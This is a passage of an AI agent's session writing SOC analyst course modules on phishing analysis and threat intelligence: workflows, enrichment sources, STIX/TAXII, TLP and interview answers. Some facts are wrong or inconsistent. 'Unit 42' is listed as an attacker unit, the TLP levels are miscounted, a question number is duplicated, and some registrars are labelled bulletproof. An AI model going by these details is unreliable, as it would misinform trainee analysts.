ENRICHMENT\n   - Campaign: \"Operation FinancePhish\" (tracking since 2023)\n   - Actor: FIN7 / Carbanak (financially motivated)\n   - Infrastructure: Reused IPs/domains from previous campaigns\n   - TTPs: Credential phishing → VPN access → Lateral → Ransomware\n\n7. CLASSIFY & RESPOND\n   - TRUE POSITIVE: Credential Phishing (T1566.002)\n   - SEVERITY: P2 (credentials entered, VPN risk)\n   - ACTIONS:\n     - Block sender domain/IP at gateway/firewall/DNS\n     - Reset passwords for 5 compromised users\n     - Revoke sessions / MFA re-enroll\n     - Search for VPN logins from compromised users (last 24h)\n     - Notify affected users + managers\n     - Update blocklists / TI platform\n     - Escalate to L2 for VPN log review\n```\n\n---\n\n## 16.5 Malicious Attachments — Analysis\n\n| Type | Execution Vector | Detection |\n|------|------------------|-----------|\n| **Office Macro (.docm, .xlsm, .pptm)** | VBA / Excel 4.0 / XLM macros | EDR (Office → Script), AMSI, 4104, Gateway sandbox |\n| **PDF** | JavaScript, Embedded exploit, Launch action | Gateway sandbox, PDF parser (pdfid, peepdf) |\n| **Archive (.zip, .rar, .7z, .iso, .img)** | Bypass gateway (password-protected, nested) | Gateway (recursive extraction), EDR on extract |\n| **HTML/HTM** | Redirect, credential form, local execution | Gateway (URL analysis), Browser isolation |\n| **LNK/URL** | Shortcut to remote payload (WebDAV, SMB) | EDR (LNK parse), Sysmon EID 11/1 |\n| **Executable (.exe, .scr, .bat, .cmd, .ps1, .vbs, .js, .wsf, .msi)** | Direct execution | Gateway (block), EDR (hash, behavior) |\n| **RTF** | CVE-2017-11882 (EQNEDT32), OLE objects | Gateway sandbox, EDR |\n\n### Attachment Analysis Steps\n```\n1. HASH (SHA256) → VT, Internal, MalwareBazaar\n2. FILE TYPE → `file` command, TrID (not extension!)\n3. STRINGS → URLs, IPs, commands, registry, mutex\n4. OFFICE → `olevba`, `oleid`, `msoffcrypto-tool` (VBA, XLM, encryption)\n5. PDF → `pdfid`, `pdf-parser`, `peepdf` (JS, /Launch, /EmbeddedFiles)\n6. ARCHIVE → Recursive extract → Repeat above\n7. SANDBOX → Hybrid Analysis, Any.Run, Joe Sandbox, Cape, internal\n   - Process tree, network, file drops, registry, MITRE tags\n8. YARA → Custom rules (phishing kit, specific actors)\n```\n\n---\n\n## 16.6 Malicious URLs — Analysis\n\n### URL Structure Analysis\n```\nhttps://subdomain.evil-domain.com:8443/path/to/page?param=value#fragment\n│       │                │           │    │                    │\n│       │                │           │    │                    └── Fragment (client-side)\n│       │                │           │    └── Query (data exfil, tracking)\n│       │                │           └── Path (phishing kit directory)\n│       │                └── Port (non-standard = suspicious)\n│       └── Domain (registration, reputation, hosting)\n└── Scheme (https = TLS, http = cleartext)\n```\n\n### URL Investigation\n| Check | Tool/Method |\n|-------|-------------|\n| **Domain Age** | WHOIS (`whois`, `domaintools`, `securitytrails`) |\n| **Registrar** | WHOIS (Namecheap, Porkbun, Njalla = bulletproof indicators) |\n| **Name Servers** | `dig NS`, passive DNS (bulletproof hosting NS) |\n| **IP / Hosting** | `dig A`, `whois IP`, ASN, VT, Shodan, Censys |\n| **SSL Certificate** | `openssl s_client`, crt.sh, Censys (issuer, SAN, validity, self-signed) |\n| **Redirect Chain** | `curl -L -v`, browser dev tools, URLScan.io |\n| **Page Content** | `curl`, `wget`, URLScan.io screenshot, DOM analysis |\n| **Phishing Kit** | Known kit signatures (filename patterns, directory structure, POST endpoint) |\n| **Reputation** | VT, URLhaus, PhishTank, Google Safe Browsing, Cisco Talos, internal |\n\n---\n\n## 16.7 Business Email Compromise (BEC) — Special Handling\n\n### BEC Types\n| Type | Scenario | Key Indicator |\n|------|----------|---------------|\n| **CEO Fraud** | \"Urgent wire transfer\" from CEO to Finance | Spoofed display name, free email (Gmail), urgency |\n| **Invoice Fraud** | \"Updated bank details\" from vendor | Legitimate vendor domain compromised or lookalike |\n| **Payroll Diversion** | \"Change my direct deposit\" from employee | HR target, personal email reply-to |\n| **Attorney Impersonation** | \"Confidential legal matter\" | Legal language, urgency, confidentiality |\n| **Account Compromise** | Real internal account hacked → sends BEC | Auth logs (impossible travel), sent items |\n\n### BEC Investigation Differences\n- **No malware, no links, no attachments** — Pure social engineering\n- **Focus**: Header analysis (Return-Path, Reply-To, SPF/DKIM/DMARC), sender verification\n- **Action**: Call sender (out-of-band), verify with finance/vendor, check auth logs for account compromise\n- **Escalation**: Immediate — Financial loss risk, legal/regulatory implications\n\n---\n\n## 16.8 Email Gateway & Security Stack\n\n| Layer | Technology | Function |\n|-------|------------|----------|\n| **MX / Perimeter** | Proofpoint, Mimecast, Cisco ESA, Microsoft Defender, Google, Barracuda | Spam, malware, phishing, DLP, encryption |\n| **Post-Delivery** | Microsoft Defender for Office 365, Gmail Security, Avanan, GreatHorn | Click-time protection, mailbox intelligence, auto-remediation |\n| **User Reporting** | Phish Alert Button (KnowBe4, Cofense, Hoxhunt, Microsoft) | Human sensor, rapid triage |\n| **Sandbox** | Hybrid Analysis, Any.Run, Joe Sandbox, Cape, Internal (Cuckoo, CAPE) | Attachment/URL detonation |\n| **URL Rewrite / Click-Time** | Gateway rewrites URLs → Proxy → Reputation check at click | Blocks delayed weaponization |\n| **DMARC Enforcement** | `p=reject` / `quarantine` + Aggregate/Forensic reports | Domain protection, visibility |\n| **Brand Indicators (BIMI)** | Verified logo in inbox (requires DMARC enforcement) | User trust, anti-spoof |\n\n---\n\n## 16.9 Interview Questions for This Module\n\n1. **What are the three email authentication protocols and what does each verify?**\n   - SPF: Sending IP authorized for domain (Return-Path). DKIM: Cryptographic signature of headers/body (d= domain). DMARC: Policy + alignment (From vs Return-Path/d=) + reporting.\n\n2. **How do you identify the true sending IP from email headers?**\n   - Read Received headers bottom-up. The bottom-most Received header from your mail server shows the connecting IP (source of the email).\n\n3. **What is the difference between SPF SoftFail (`~all`) and HardFail (`-all`)?**\n   - SoftFail: Accept but mark suspicious (spam folder). HardFail: Reject outright. DMARC treats both as \"fail\" for alignment.\n\n4. **A phishing email has `From: CEO <ceo@company.com>` but `Return-Path: <bounce@attacker.com>` and `Reply-To: <hr@evil.com>`. What does this indicate?**\n   - Display name spoofing (CEO), true sender is attacker.com (Return-Path), replies go to attacker (Reply-To). SPF/DKIM/DMARC will likely fail.\n\n5. **What tools do you use to analyze a malicious Office document?**\n   - `olevba` (VBA macros), `oleid` (OLE info), `msoffcrypto-tool` (decrypt), `oletools` suite, sandbox (Hybrid Analysis, Any.Run), AMSI/4104 logs.\n\n6. **How do you investigate a malicious URL without clicking it?**\n   - `curl -L -v` for redirect chain, `openssl s_client` for cert, `whois`/`dig` for domain/IP, VT/URLhaus/URLScan.io for reputation/screenshot, passive DNS.\n\n7. **What makes BEC different from typical phishing and how do you investigate it?**\n   - No malware/links/attachments. Pure social engineering. Investigate headers (Return-Path, Reply-To, auth results), verify sender out-of-band, check auth logs for account compromise.\n\n8. **What is DMARC alignment and why does it matter?**\n   - SPF Alignment: From domain == Return-Path domain. DKIM Alignment: From domain == d= domain. DMARC passes if either aligns + passes. Prevents spoofing where auth passes but From is forged.\n\n8. **What is \"URL Rewriting\" in email gateways and why is it effective?**\n   - Gateway rewrites all URLs to point through its proxy. At click time, proxy checks reputation. Catches delayed weaponization (clean at delivery, malicious later).\n\n9. **What is a \"Consent Phishing\" attack?**\n   - Malicious OAuth app requests permissions (Graph API: Mail.Read, Files.ReadWrite). User consents → attacker gets token → accesses data without credentials.\n\n10. **What are the key indicators of a QR code phishing (Quishing) attack?**\n    - QR code in email body (image), no visible URL, directs to phishing site when scanned. Mobile users bypass gateway URL scanning. Analyze: extract QR (zbarimg), check URL.\n\n---\n\n## 16.10 Study Checklist for Module 16\n\n- [ ] Classify 9 phishing types with target/method/sophistication\n- [ ] Parse email headers: From, Return-Path, Reply-To, Received chain, Authentication-Results, DKIM-Signature\n- [ ] Explain SPF, DKIM, DMARC mechanisms, tags, and alignment\n- [ ] Execute phishing analysis workflow (headers → infrastructure → content → recipients → TI → classify)\n- [ ] Analyze 7 malicious attachment types with tools (olevba, pdfid, strings, sandbox)\n- [ ] Investigate URLs: domain age, registrar, NS, IP/hosting, cert, redirect chain, content, reputation\n- [ ] Differentiate BEC types and investigation approach (no malware, verify out-of-band)\n- [ ] Map email security stack layers (MX, Post-delivery, User reporting, Sandbox, URL rewrite, DMARC, BIMI)\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 17 — Threat Intelligence*"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 21.2s)

_Thinking:_

Good, Module 16 is done. Now let me continue with Module 17 - Threat Intelligence.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 81.9s)

_Thinking:_

Now let me create Module 17 - Threat Intelligence.

**Tool: write**

**Input:**
```json
{
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/17-threat-intelligence.md",
  "content": "# Module 17: Threat Intelligence\n\n**Priority: P1 — Context for every alert. L1 uses TI for enrichment, classification, escalation.**\n\n---\n\n## 17.1 Threat Intelligence Fundamentals\n\n### What is Threat Intelligence?\n**Evidence-based knowledge** about existing or emerging threats, including context, mechanisms, indicators, implications, and actionable advice. Used to inform decisions.\n\n### Intelligence Cycle (Standard)\n```\n1. PLANNING & DIRECTION     → Requirements (PIRs: Priority Intelligence Requirements)\n2. COLLECTION               → Sources (OSINT, Closed, Technical, Human)\n3. PROCESSING               → Normalize, translate, structure (STIX/TAXII)\n4. ANALYSIS                 → Connect dots, assess credibility, produce intel\n5. DISSEMINATION            → Deliver to consumers (L1, L2, IR, Hunt, Exec)\n6. FEEDBACK                 → Evaluate utility, adjust requirements\n```\n\n### Intelligence Types (by Consumer)\n| Type | Audience | Time Horizon | Example |\n|------|----------|--------------|---------|\n| **Strategic** | CISO, Exec, Board | Months/Years | Threat landscape, actor motivations, risk trends |\n| **Operational** | SOC Manager, IR Lead, Hunt Lead | Days/Weeks | Campaign tracking, TTPs, infrastructure, targeting |\n| **Tactical** | **L1/L2 Analysts** | **Hours/Days** | **IOCs (IP, Domain, Hash, URL), Malware configs, Tool signatures** |\n| **Technical** | Detection Eng, SIEM, EDR | Real-time | **Atomic IOCs, YARA, Sigma, Snort, STIX patterns** |\n\n**L1 Focus**: **Tactical + Technical** — Enrichment, classification, immediate action.\n\n---\n\n## 17.2 IOC / IOA / TTP — The Hierarchy\n\n| Level | Name | Examples | Lifespan | L1 Action |\n|-------|------|----------|----------|-----------|\n| **IOC** (Indicator of Compromise) | **Static artifacts** | Hash (MD5/SHA256), IP, Domain, URL, Email, Registry key, Mutex, Filename | **Short** (hours-days, rotate fast) | **Block, Alert, Enrich, Hunt** |\n| **IOA** (Indicator of Attack) | **Behavioral patterns** | \"PowerShell downloading encoded script\", \"LSASS memory read\", \"Scheduled task creating service\" | **Medium** (weeks-months, technique stable) | **Detect (Sigma/EDR), Correlate, Map to MITRE** |\n| **TTP** (Tactics, Techniques, Procedures) | **Adversary behavior** | T1059.001 (PowerShell), T1003.001 (LSASS dump), T1566.002 (Phishing link) | **Long** (years, fundamental) | **Map alerts, Build detections, Hunt, Strategic planning** |\n\n**Key Insight**: **IOCs expire; IOAs persist; TTPs endure.** L1 triage starts with IOCs, pivots to IOAs, maps to TTPs.\n\n---\n\n## 17.3 IOC Types & Enrichment Fields\n\n| IOC Type | Enrichment Fields | Sources |\n|----------|-------------------|---------|\n| **IP Address** | Geo, ASN, Org, Hosting Provider, Open Ports, Historical Resolutions, Malicious Activity Tags, Reputation Score, First/Last Seen | AbuseIPDB, AlienVault OTX, VirusTotal, GreyNoise, Shodan, Censys, Internal TIP |\n| **Domain** | Registrar, Registration Date, Expiry, Name Servers, MX, TXT, SPF/DMARC, Historical IPs (Passive DNS), Subdomains, SSL Certs, Category, Reputation | WHOIS, PassiveTotal, SecurityTrails, VirusTotal, URLhaus, Cisco Talos, Internal TIP |\n| **URL** | Domain enrichment + Path analysis, Redirect chain, Page content, Phishing kit ID, Hosting IP, Cert | URLScan.io, PhishTank, VirusTotal, Hybrid Analysis, Internal Proxy |\n| **Hash (File)** | File type, Size, Imports/Exports, Strings, YARA matches, Sandbox verdicts, Family, Compiler, Signer, First Submission, Prevalence | VirusTotal, Hybrid Analysis, MalwareBazaar, Any.Run, Joe Sandbox, Internal Sandbox |\n| **Email** | Sender IP/Domain, Headers (SPF/DKIM/DMARC), Attachments (hashes), URLs, Language, Campaign ID | Email Gateway, PhishTank, Internal TIP |\n| **Mutex / Registry / Filename** | Malware family association, Persistence location, Prevalence | EDR, Sandbox, Internal TIP |\n\n---\n\n## 17.4 Threat Intelligence Sources\n\n### Open Source (OSINT) — Free\n| Platform | Focus | API |\n|----------|-------|-----|\n| **VirusTotal** | Files, URLs, Domains, IPs, Behavior | Yes (rate limited) |\n| **Hybrid Analysis** | Dynamic sandbox reports | Yes |\n| **MalwareBazaar** | Malware samples, hashes, tags | Yes |\n| **URLhaus** | Malicious URLs, payloads | Yes |\n| **AbuseIPDB** | Abusive IPs, reports | Yes |\n| **AlienVault OTX** | Pulses (IOCs + context), Actors, Malware | Yes |\n| **MISP** | Threat sharing platform (community) | Yes |\n| **Cisco Talos** | IP/Domain reputation, Vulnerabilities | Yes |\n| **IBM X-Force** | IP/URL/File reputation, Threat research | Yes |\n| **GreyNoise** | Internet scanner classification (benign/malicious) | Yes |\n| **PassiveTotal / RiskIQ** | Passive DNS, SSL, Host pairs, Infrastructure | Yes (freemium) |\n| **SecurityTrails** | Historical DNS, WHOIS, Subdomains, SSL | Yes (freemium) |\n| **URLScan.io** | URL screenshot, DOM, Redirects, Certs, IPs | Yes |\n| **PhishTank** | Verified phishing URLs | Yes |\n| **CERT/CC, CISA, NCSC** | Advisories, Alerts, Vulnerabilities | RSS/Email |\n\n### Commercial / Closed — Higher Fidelity\n| Vendor | Strength |\n|--------|----------|\n| **CrowdStrike Falcon Intelligence** | Actor tracking, Campaigns, Malware families, IOCs |\n| **Mandiant (Google Cloud)** | APT expertise, Incident-based intel |\n| **Palo Alto AutoFocus / Unit 42** | WildFire sandbox, Campaign tracking |\n| **Microsoft Defender Threat Intelligence** | Graph integration, Nation-state tracking |\n| **Recorded Future** | Risk scoring, Predictive, Dark web monitoring |\n| **Flashpoint / Intel 471** | Underground forums, Ransomware, Fraud |\n| **Anomali / ThreatConnect / EclecticIQ** | TIP platforms (aggregate + enrich) |\n\n### Internal Sources\n| Source | Value |\n|--------|-------|\n| **Previous Incidents** | IOCs, TTPs, Actor attribution, Lessons learned |\n| **EDR/SIEM Detections** | Behavioral patterns, Anomalous activity |\n| **Red Team / Purple Team** | Simulated TTPs, Detection gaps |\n| **Vulnerability Scans** | Exploitable assets, Patch status |\n| **User Reports** | Phishing emails, Suspicious activity |\n\n---\n\n## 17.5 TIP (Threat Intelligence Platform) — Core Functions\n\n| Function | Description |\n|----------|-------------|\n| **Aggregation** | Ingest feeds (STIX/TAXII, CSV, JSON, API, Email) |\n| **Deduplication** | Merge duplicate IOCs across sources |\n| **Enrichment** | Auto-enrich IOCs (Geo, ASN, WHOIS, Passive DNS, Sandbox) |\n| **Scoring** | Confidence, Relevance, Severity, TLP, Expiration |\n| **Tagging** | Actor, Campaign, Malware Family, MITRE ATT&CK, Sector, Region |\n| **Relationships** | Link IOCs → Malware → Actor → Campaign → Victimology |\n| **Export / Dissemination** | STIX/TAXII, API, CSV, SIEM/EDR/Firewall push (blocklists) |\n| **Hunting** | Pivot from IOC → Related IOCs → Infrastructure → Actor |\n| **Reporting** | Strategic/Operational briefs, IOC packages |\n\n---\n\n## 17.6 STIX / TAXII — Standards\n\n### STIX (Structured Threat Information Expression)\n**JSON-based** format for representing threat intel objects and relationships.\n\n**Core Objects (STIX 2.1)**:\n| Object | Purpose |\n|--------|---------|\n| **Indicator** | IOC + Pattern (STIX Patterning Language) |\n| **Malware** | Malware family, labels, capabilities |\n| **Attack-Pattern** | MITRE ATT&CK technique (TTP) |\n| **Threat-Actor** | Actor/group, motivation, sophistication |\n| **Campaign** | Set of activities over time, objective |\n| **Intrusion-Set** | Grouping of campaigns/activity (APT28, FIN7) |\n| **Infrastructure** | C2 servers, Domains, IPs, Hosting |\n| **Tool** | Software used (Cobalt Strike, Mimikatz) |\n| **Vulnerability** | CVE, Exploitability |\n| **Observed-Data** | Raw sightings (IP seen at time) |\n| **Report** | Intelligence report (PDF/HTML summary) |\n| **Relationship** | Links between objects (uses, targets, indicates, attributed-to) |\n\n### TAXII (Trusted Automated Exchange of Indicator Information)\n**HTTPS-based** protocol for sharing STIX data.\n- **Discovery** → Find collections\n- **Collection** → Pull IOCs (polling or streaming)\n- **Channel** → Push/Receive real-time\n\n---\n\n## 17.7 TI Enrichment Workflow for L1 (Automated via SOAR)\n\n```\nALERT TRIGGERS\n      │\n      ▼\n┌─────────────────────────────────────────────┐\n│  EXTRACT IOCs FROM ALERT                    │\n│  - File Hash (SHA256)                       │\n│  - Source/Dest IP                           │\n│  - Domain/URL                               │\n│  - Email Address/Domain                     │\n│  - Registry Key / Mutex / Filename          │\n└─────────────────────┬───────────────────────┘\n                      ▼\n┌─────────────────────────────────────────────┐\n│  SOAR: PARALLEL ENRICHMENT                  │\n│  ├─ VirusTotal (Hash, IP, Domain, URL)      │\n│  ├─ AbuseIPDB / GreyNoise (IP)              │\n│  ├─ PassiveTotal / SecurityTrails (Domain)  │\n│  ├─ URLScan.io / PhishTank (URL)            │\n│  ├─ Internal TIP (Actor, Campaign, History) │\n│  └─ MITRE ATT&CK Mapping (Technique tags)   │\n└─────────────────────┬───────────────────────┘\n                      ▼\n┌─────────────────────────────────────────────┐\n│  CORRELATE & SCORE                          │\n│  - Confidence: High/Med/Low (source weight) │\n│  - Relevance: Asset, User, Sector match     │\n│  - TLP: White/Green/Amber/Red (sharing)     │\n│  - Expiration: IOC age, last seen           │\n└─────────────────────┬───────────────────────┘\n                      ▼\n┌─────────────────────────────────────────────┐\n│  OUTPUT TO ANALYST                          │\n│  - Enriched IOC Table                       │\n│  - Malware Family / Actor / Campaign        │\n│  - MITRE ATT&CK Techniques                  │\n│  - Related IOCs (Pivot)                     │\n│  - Recommended Actions (Block, Hunt, Ignore)│\n└─────────────────────────────────────────────┘\n```\n\n---\n\n## 17.8 TI Sharing & Classification (TLP)\n\n### Traffic Light Protocol (TLP) — FIRST.org\n| Level | Sharing Scope | Use Case |\n|-------|---------------|----------|\n| **TLP:RED** | **Named recipients only** (personal) | Highly sensitive, active ops, PII |\n| **TLP:AMBER** | **Organization + Clients** (need-to-know) | Internal defense, partner sharing |\n| **TLP:AMBER+STRICT** | **Organization only** | Sensitive internal |\n| **TLP:GREEN** | **Community** (peers, sector) | Sector-wide threat info |\n| **TLP:WHITE** | **Public** (no restriction) | Published reports, OSINT |\n\n**L1 Rule**: Never share TLP:RED/AMBER outside authorized channels. Default to TLP:AMBER for internal SOC.\n\n---\n\n## 17.9 Attribution — L1 Perspective\n\n### Attribution Levels (Increasing Confidence)\n| Level | Description | L1 Role |\n|-------|-------------|---------|\n| **None** | No actor link | Report IOCs only |\n| **Malware Family** | \"Emotet\", \"Cobalt Strike\", \"LockBit\" | Tag alerts, Map TTPs |\n| **Campaign** | \"Operation FinancePhish 2024\" | Link alerts, Track scope |\n| **Intrusion Set / Group** | \"FIN7\", \"APT29\", \"Lazarus\" | Strategic context, Predict TTPs |\n| **Nation-State** | \"Russia (GRU)\", \"China (MSS)\", \"North Korea (Lazarus)\" | Executive reporting, Legal/Regulatory |\n| **Specific Unit** | \"APT29 (Cozy Bear)\", \"Unit 42\" | High-confidence, Rare for L1 |\n\n**L1 Rule**: **Don't over-attribute.** Tag what you know (Malware Family, Campaign). Escalate attribution to Intel Team.\n\n---\n\n## 17.10 Interview Questions for This Module\n\n1. **What is the difference between IOC, IOA, and TTP?**\n   - IOC: Static artifact (hash, IP, domain) — short lifespan. IOA: Behavioral pattern (PowerShell download) — medium lifespan. TTP: Adversary tactic/technique (T1059.001) — long lifespan.\n\n2. **What are the four types of threat intelligence and who consumes each?**\n   - Strategic (Exec/Board, years), Operational (SOC Manager/IR/Hunt, weeks), Tactical (L1/L2, days), Technical (Detection Eng/SIEM, real-time).\n\n3. **What enrichment fields do you check for a malicious IP address?**\n   - Geo, ASN, Org, Hosting Provider, Open Ports, Historical Resolutions, Malicious Tags, Reputation Score, First/Last Seen.\n\n4. **What is the STIX/TAXII standard and what are core STIX objects?**\n   - STIX: JSON format for threat intel (Indicator, Malware, Attack-Pattern, Threat-Actor, Campaign, Infrastructure, Tool, Vulnerability, Relationship). TAXII: HTTPS protocol for STIX exchange (Discovery, Collection, Channel).\n\n5. **How does the TLP (Traffic Light Protocol) work and what are the four levels?**\n   - RED (named recipients only), AMBER (org+clients), GREEN (community), WHITE (public). Controls sharing sensitivity.\n\n6. **What is the threat intelligence cycle?**\n   - Planning → Collection → Processing → Analysis → Dissemination → Feedback.\n\n7. **How do you use threat intelligence during alert triage?**\n   - Extract IOCs from alert → Automated enrichment (VT, AbuseIPDB, PassiveTotal, Internal TIP) → Correlate (Actor, Campaign, Malware Family, MITRE) → Score confidence/relevance → Classify alert (TP/FP/BP) → Recommend actions.\n\n8. **What is the difference between a \"Malware Family\" and an \"Intrusion Set\"?**\n   - Malware Family: Technical grouping (Emotet, Cobalt Strike). Intrusion Set: Actor grouping with intent/capability (FIN7, APT29). One Intrusion Set uses multiple Malware Families.\n\n9. **Name 5 free OSINT threat intel sources and what they provide.**\n   - VirusTotal (hash/url/domain/ip reputation), Hybrid Analysis (sandbox), URLhaus (malicious URLs), AbuseIPDB (abusive IPs), AlienVault OTX (pulses/actors).\n\n10. **How does a TIP (Threat Intelligence Platform) help L1 analysts?**\n    - Aggregates/deduplicates feeds, auto-enriches IOCs, scores confidence, tags MITRE/actor/campaign, exports blocklists to SIEM/EDR/Firewall, enables pivot hunting.\n\n---\n\n## 17.11 Study Checklist for Module 17\n\n- [ ] Define Threat Intelligence and the 6-step intelligence cycle\n- [ ] Distinguish Strategic, Operational, Tactical, Technical intel with consumers/timeframes\n- [ ] Compare IOC vs IOA vs TTP (lifespan, examples, L1 action)\n- [ ] List enrichment fields for IP, Domain, URL, Hash, Email\n- [ ] Categorize 15+ TI sources (OSINT, Commercial, Internal)\n- [ ] Explain TIP core functions (aggregation, enrichment, scoring, tagging, export)\n- [ ] Describe STIX 2.1 core objects and TAXII protocol\n- [ ] Execute TI enrichment workflow (Extract → Parallel Enrich → Correlate → Output)\n- [ ] Apply TLP classification (RED/AMBER/GREEN/WHITE)\n- [ ] Explain attribution levels and L1 role (don't over-attribute)\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 18 — MITRE ATT&CK*"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 29.4s)

_Thinking:_

Good, Module 17 is done. Now let me continue with Module 18 - MITRE ATT&CK.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
